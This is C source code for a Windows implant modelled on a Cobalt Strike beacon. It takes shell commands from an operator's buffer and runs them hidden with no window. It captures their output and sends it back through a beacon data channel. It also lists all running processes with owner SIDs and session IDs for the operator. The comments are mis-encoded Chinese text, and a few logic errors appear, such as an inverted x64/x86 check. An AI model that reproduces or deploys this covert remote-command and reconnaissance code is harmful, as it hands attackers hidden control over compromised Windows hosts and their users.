#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include "Command.h"
#include "Job.h"
#pragma warning(disable:4996)
#ifdef UNICODE
#include <TlHelp32.h>
#define TCHAR wchar_t
#define TEXT(str) L##str
#else
#define TCHAR char
#define TEXT(str) str
#endif

// convert unsigned char* to _TCHAR*
TCHAR* ConvertTo_TCHAR(const unsigned char* input) {
#ifdef UNICODE
    // If you are using Unicode
    int length = MultiByteToWideChar(CP_UTF8, 0, (const char*)input, -1, NULL, 0);
    TCHAR* result = (TCHAR*)malloc(length * sizeof(TCHAR));
    MultiByteToWideChar(CP_UTF8, 0, (const char*)input, -1, result, length);
    return result;
#else
    // If you are using ANSI
    int length = strlen((const char*)input);
    TCHAR* result = (TCHAR*)malloc((length + 1) * sizeof(TCHAR)); 
    strcpy(result, (const char*)input);
    return result;
#endif
}

typedef struct {
    unsigned char* shellPath;
    unsigned char* shellBuf;
} ParseCommandShellparse;

struct ThreadArgs {
    unsigned char* commandBuf;
    size_t* commandBuflen;
};

ParseCommandShellparse ParseCommandShell(unsigned char* commandBuf) {
    // pathLength(4 Bytes) | path | cmdLength(4 Bytes) |  cmd
    uint8_t pathLenBytes[4];
    ParseCommandShellparse result = { 0 };
    memcpy(pathLenBytes, commandBuf, 4);
    uint32_t pathLength = bigEndianUint32(pathLenBytes);
    unsigned char* path = (unsigned char*)malloc(pathLength + 1);
    if (!path) {
        fprintf(stderr, "Memory allocation failed for path\n");
        return result;
    }
    if (pathLength > 0) {
        path[pathLength] = '\0';
    }
    unsigned char* pathstart = commandBuf + 4;
    memcpy(path, pathstart, pathLength); // %COMSPEC%
    uint8_t cmdLenBytes[4];
    unsigned char* cmdLenBytesStart = commandBuf + 4 + pathLength;
    memcpy(cmdLenBytes, cmdLenBytesStart, 4);
    uint32_t cmdLength = bigEndianUint32(cmdLenBytes);
    unsigned char* cmdArgs = (unsigned char*)malloc(cmdLength + 1);
    if (!cmdArgs) {
        fprintf(stderr, "Memory allocation failed for cmdArgs\n");
        free(path);
		return result;
    }
    if (cmdLength > 0) {
        cmdArgs[cmdLength] = '\0';
    }
    unsigned char* cmdBufferStart = commandBuf + 8 + pathLength;
    memcpy(cmdArgs, cmdBufferStart, cmdLength);     // /C whoami
    unsigned char* envKey = str_replace_all(path, "%", ""); // ȥ�� "%"

    unsigned char* cmdPathFromEnv = getenv(envKey); // C:\WINDOWS\system32\cmd.exe
    ParseCommandShellparse ParseCommandShellparse;
    ParseCommandShellparse.shellPath = cmdPathFromEnv;
    ParseCommandShellparse.shellBuf = cmdArgs;

    free(path);
    return ParseCommandShellparse;
}

DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* commandBuf = args->commandBuf;
    size_t* commandBuflen = args->commandBuflen;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    // ����������Ϊ TRUE ��ʾ�ӽ��̿��Լ̳йܵ����
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "CreatePipe Failed With Error:%lu", GetLastError());
        free(args);
        return FALSE;
    }

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;

    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
    LPSTR shellBuf = (LPSTR)ParseCommand.shellBuf;

    // ���� CreateProcessA ����
    CHAR commandLine[MAX_PATH];
    snprintf(commandLine, MAX_PATH, "%s", shellBuf);

    // ִ�н����д�� hReadPipe 
    if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcessA Failed With Error:%lu\n", GetLastError());
        free(shellBuf);
        free(args->commandBuf);
        free(args);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

    DWORD numberOfBytesRead = 0;
    DWORD bufferSize = 1024 * 10;
    BOOL firstTime = TRUE;
    unsigned char* buffer = (unsigned char*)malloc(bufferSize);

    // �رո����̹ܵ����������رգ������� hReadPipe û�����ݵ������ ReadFile ������
    if (CloseHandle(hWritePipe) == FALSE) {
        fprintf(stderr, "CloseHandle Failed With Error:%lu\n", GetLastError());
        free(buffer);
        free(shellBuf);
        free(args->commandBuf);
        free(args);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hReadPipe);
        return FALSE;
    }

    while (TRUE) {
        Sleep(5000);

        if (!ReadFile(hReadPipe, buffer, bufferSize, &numberOfBytesRead, NULL)) {
            DWORD errorCode = GetLastError();
            // hWritePipe ����رպ�û����������� ERROR_BROKEN_PIPE
            if (errorCode == ERROR_BROKEN_PIPE) {
                unsigned char* endStr = "-----------------------------------end-----------------------------------\n";
                unsigned char* resultStr = malloc(strlen(endStr) + 1);
                if (resultStr) {
                    memcpy(resultStr, endStr, strlen(endStr) + 1);
                    DataProcess(resultStr, strlen(endStr), 0);
                    break;
                }
            }
            else {
                fprintf(stderr, "ReadFile Failed With Error:%lu\n", errorCode);
                free(buffer);
                free(shellBuf);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                CloseHandle(hReadPipe);
                free(args->commandBuf);
                free(args);
                return FALSE;
            }
        }
        else {
            if (numberOfBytesRead > 0) {
                if (firstTime) {
                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (resultStr) {
                        memcpy(resultStr, buffer, numberOfBytesRead);
                        DataProcess(resultStr, numberOfBytesRead, 0);
                    }
                    firstTime = FALSE;
                }
                else {
                    char prompt[MAX_PATH];
                    snprintf(prompt, MAX_PATH, "[+] %s :\n", commandLine);
                    DataProcess((unsigned char*)prompt, strlen(prompt), 0);
                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (resultStr) {
                        memcpy(resultStr, buffer, numberOfBytesRead);
                        DataProcess(resultStr, numberOfBytesRead, 0);
                        free(resultStr);
                    }
                }
            }
        }
    }

    free(buffer);
    free(shellBuf);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);
    free(args->commandBuf);
    free(args);
    return TRUE;
}

DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
    Sleep(2000);
    struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
    unsigned char* commandBuf = args->commandBuf;
    size_t* commandBuflen = args->commandBuflen;

    BOOL bRet = FALSE;

    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
	// ����������Ϊ TRUE ��ʾ�ӽ��̿��Լ̳йܵ����
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "CreatePipe Failed With Error:%lu", GetLastError());
        free(args->commandBuf);
        free(args);
        return FALSE;
    }

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.cb = sizeof(STARTUPINFO);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;

    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
    LPSTR shellPath = (LPSTR)ParseCommand.shellPath;
    LPSTR shellBuf = (LPSTR)ParseCommand.shellBuf;

    // ���� CreateProcessA ����
    CHAR commandLine[MAX_PATH];
    // C:\WINDOWS\system32\cmd.exe /C whoami
    snprintf(commandLine, MAX_PATH, "%s %s", shellPath, shellBuf);

    // ִ�н����д�� hReadPipe 
    if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "CreateProcessA Failed With Error:%lu\n", GetLastError());
        free(shellBuf);
        free(args->commandBuf);
        free(args);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return FALSE;
    }

	DWORD numberOfBytesRead = 0;
    DWORD bufferSize = 1024 * 10;
	BOOL firstTime = TRUE;
    unsigned char* buffer = (unsigned char*)malloc(bufferSize);
    
	// �رո����̹ܵ����������رգ������� hReadPipe û�����ݵ������ ReadFile ������
    if(CloseHandle(hWritePipe) == FALSE) {
        fprintf(stderr, "CloseHandle Failed With Error:%lu\n", GetLastError());
        free(buffer);
        free(shellBuf);
        free(args->commandBuf);
        free(args);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        CloseHandle(hReadPipe);
        return FALSE;
	}

    while (TRUE) {
        Sleep(5000);

        if(!ReadFile(hReadPipe, buffer, bufferSize, &numberOfBytesRead, NULL)) {
            DWORD errorCode = GetLastError();
            // hWritePipe ����رպ�û����������� ERROR_BROKEN_PIPE
            if (errorCode == ERROR_BROKEN_PIPE) {
                unsigned char* endStr = "-----------------------------------end-----------------------------------\n";
                unsigned char* resultStr = malloc(strlen(endStr) + 1);
                if(resultStr) {
                    memcpy(resultStr, endStr, strlen(endStr) + 1);
                    DataProcess(resultStr, strlen(endStr), 0);
                    break;
				}
            }
            else {
                fprintf(stderr, "ReadFile Failed With Error:%lu\n", errorCode);
                free(buffer);
                free(shellBuf);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                CloseHandle(hReadPipe);
                free(args->commandBuf);
                free(args);
                return FALSE;
            }
		}
        else {
            if(numberOfBytesRead > 0) {
                if (firstTime) {
                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (resultStr) {
                        memcpy(resultStr, buffer, numberOfBytesRead);
                        DataProcess(resultStr, numberOfBytesRead, 0);
                    }
                    firstTime = FALSE;
                }
                else {
                    char prompt[MAX_PATH];   
                    snprintf(prompt, MAX_PATH, "[+] %s :\n", commandLine);
                    DataProcess((unsigned char*)prompt, strlen(prompt), 0);
                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
                    if (resultStr) {
                        memcpy(resultStr, buffer, numberOfBytesRead);
                        DataProcess(resultStr, numberOfBytesRead, 0);
                        free(resultStr);
                    }
                }
			}
        }
    }

    free(buffer);
    free(shellBuf);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);
    free(args->commandBuf);
    free(args);
    return TRUE;
}

VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
{ 
	// ����̻߳�ô���� commandBuf ���ܱ��ͷŵ�����
    struct ThreadArgs* args = malloc(sizeof(struct ThreadArgs));
    args->commandBuf = (unsigned char*)malloc(*commandBuflen);
    if (args->commandBuf) {
        memcpy(args->commandBuf, commandBuf, *commandBuflen);
    }
    args->commandBuflen = *commandBuflen;

    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
    HANDLE myThread;
    if (ParseCommand.shellPath == NULL) {
        myThread = CreateThread(
            NULL,                       // Ĭ���̰߳�ȫ��
            0,                          // Ĭ�϶�ջ��С
            myThreadCmdRun,             // �̺߳���
            args,                       // ���ݸ��̺߳����Ĳ���
            0,                          // Ĭ�ϴ�����־
            NULL);                      // ���洢�߳�ID
        if (myThread == NULL) {
            fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
			free(args->commandBuf);
            free(args);
            return;
        }
    }
    else {
        // shell ָ������� Ӧ�ö��ǽ��������֧
        myThread = CreateThread(
            NULL,                       // Ĭ���̰߳�ȫ��
            0,                          // Ĭ�϶�ջ��С
            myThreadCmdshell,           // �̺߳���
            args,                       // ���ݸ��̺߳����Ĳ���
            0,                          // Ĭ�ϴ�����־
            NULL);                      // ���洢�߳�ID
        if (myThread == NULL) {
            fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
            free(args->commandBuf);
            free(args);
            return;
        }
        // �첽ִ��
		// ��ʹ�� WaiteForSingleObject
        // WaitForSingleObject(myThread, INFINITE);
        CloseHandle(myThread);

    }
}

int get_user_sid(size_t BufferSize, HANDLE TokenHandle, char* Buffer)
{
    char Name[512];
    char ReferencedDomainName[512];
    DWORD cchReferencedDomainName = 512;

    SID_NAME_USE peUse;
    memset(Buffer, 0, BufferSize);
    memset(Name, 0, sizeof(Name));
    memset(ReferencedDomainName, 0, sizeof(ReferencedDomainName));

    DWORD ReturnLength;
    TOKEN_USER* TokenInformation;
    DWORD cchName = 512;

    // ��ȡ����� TokenInformation ��С
    if (!GetTokenInformation(TokenHandle, TokenUser, NULL, 0, &ReturnLength) && GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        return 0;

    // �����ڴ������� TokenInformation
    TokenInformation = (TOKEN_USER*)malloc(ReturnLength);
    if (TokenInformation == NULL)
        return 0;

    // ��ȡ TokenInformation
    if (!GetTokenInformation(TokenHandle, TokenUser, TokenInformation, ReturnLength, &ReturnLength))
    {
        free(TokenInformation);
        return 0;
    }

    if (!LookupAccountSidA(
        NULL,
        TokenInformation->User.Sid,
        Name,
        &cchName,
        ReferencedDomainName,
        &cchReferencedDomainName,
        &peUse))
    {
        free(TokenInformation);
        return 0;
    }

    snprintf(Buffer, BufferSize, "%s\\%s", ReferencedDomainName, Name);
    Buffer[BufferSize - 1] = 0;

    free(TokenInformation);
    return 1;
}

BOOL GetProcessUserInfo(HANDLE ProcessHandle, char* usersid)
{
    HANDLE TokenHandle;
    BOOL status = OpenProcessToken(ProcessHandle, 8u, &TokenHandle);
    if (status)
    {
        status = get_user_sid(0x800, TokenHandle, usersid);
        CloseHandle(TokenHandle);
        return status;
    }
    return status;
}

BOOL IsProcessX64s(DWORD pid) {
    BOOL isX64 = FALSE;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (hProcess != NULL) {
        BOOL result = IsWow64Process(hProcess, &isX64);
        CloseHandle(hProcess);
        return result && isX64;
    }
    return FALSE;
}

VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
{
    char usersid[2048];
    memset(usersid, 0, sizeof(usersid));

    datap datap;
    BeaconDataParse(&datap, commandBuf, *commandBuflen);
    int unknown = BeaconDataInt(&datap);
    BeaconFormatAlloc((formatp*)&datap, 0x8000);
    if (unknown > 0)
    {
        BeaconFormatInt((formatp*)&datap, unknown);
    }
 
    DWORD pSessionId;
    DWORD th32ProcessID;
    PROCESSENTRY32 pe;
    HANDLE hprocess;
    HANDLE Toolhelp32Snapshot = CreateToolhelp32Snapshot(2u, 0);
    if (Toolhelp32Snapshot != (HANDLE)-1)
    {
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(Toolhelp32Snapshot, &pe))
        {
            do
            {
                th32ProcessID = pe.th32ProcessID;
                const char* arch2 = "x64";
                BOOL isX64 = IsProcessX64s(pe.th32ProcessID);
                arch2 = !isX64 ? "x64" : "x86";
                hprocess = OpenProcess( PROCESS_ALL_ACCESS, 0, th32ProcessID);
                wchar_t* szExeFile = pe.szExeFile;
                int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, NULL, 0, NULL, NULL);
                // �����㹻���ڴ����洢ת������ַ���
                char* szExeFileConverted = (char*)malloc(bufferSize);
                // �� wchar_t* �����ַ���ת���� char* �����ַ���
                WideCharToMultiByte(CP_UTF8, 0, szExeFile, -1, szExeFileConverted, bufferSize, NULL, NULL);
                if (hprocess)
                {
                    if (!GetProcessUserInfo(hprocess, usersid))
                    {
                        usersid[0] = 0;
                    }
                    if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                    {
                        pSessionId = -1;
                    }

                    BeaconFormatPrintf(
                        (formatp*)&datap,
                        (char*)"%s\t%d\t%d\t%s\t%s\t%d\n",
                        szExeFileConverted,
                        pe.th32ParentProcessID,
                        pe.th32ProcessID,
                        arch2,
                        usersid,
                        pSessionId);
                    CloseHandle(hprocess);
                }
                else
                {
                    if (!ProcessIdToSessionId(pe.th32ProcessID, &pSessionId))
                    {
                        pSessionId = 0;
                    }
                    BeaconFormatPrintf((formatp*)&datap, (char*)"%s\t%d\t%d\t%s\t%s\t%d\n", 
                        szExeFileConverted,
                        pe.th32ParentProcessID,
                        pe.th32ProcessID,
                        arch2,
                        "",
                        pSessionId);
                }
            } while (Process32Next(Toolhelp32Snapshot, &pe));
            CloseHandle(Toolhelp32Snapshot);
            int msg_type;
            if (unknown)
            {
                msg_type = 22;
            }
            else
            {
                msg_type = 17;
            }
            int datalength = BeaconFormatLength((formatp*)&datap);
            char* databuffer = BeaconFormatOriginal((formatp*)&datap);
            DataProcess(databuffer, datalength, msg_type);
            BeaconFormatFree((formatp*)&datap);
        }
        else
        {
            CloseHandle(Toolhelp32Snapshot);
        }
    }
}